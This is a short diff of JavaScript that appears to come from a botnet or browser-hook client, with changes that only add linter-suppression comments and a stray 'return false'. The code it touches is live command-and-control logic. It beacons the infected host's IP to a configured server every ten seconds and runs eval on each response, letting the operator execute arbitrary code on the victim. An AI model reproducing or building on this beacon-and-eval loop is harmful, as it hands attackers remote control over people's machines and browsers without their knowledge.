@@ -14,6 +14,7 @@ function hook_cnc(data, callback){
 	  if (this.readyState == 4 && this.status != 200){
 		return false;
 	  }
+      return false;
 	};
 	http.open('POST', 'http://' + config.server + ':' + config.port, true);
 	http.setRequestHeader('Content-Type', 'application/json');
@@ -34,7 +35,7 @@ function sleep(ms) {
   }
 }
 
-async function hook(){
+async function hook(){ // jshint ignore:line
   try {
 	for (;;){
 	  let data = {
@@ -57,18 +58,18 @@ async function hook(){
 		}
 	  };
 	  get_ips(
-		function(ip){
+		function(ip){ // jshint ignore:line
 		  data.bot.ip = ip;
 		  hook_cnc(
 			data,
 			function(responseText){
-			  eval(responseText);
+			  eval(responseText); // jshint ignore:line
 			  return true;
 			}
 		  );
 		}
 	  );
-	  await sleep(10000);
+	  await sleep(10000); // jshint ignore:line
 	}
 	return true;
   } catch(error){
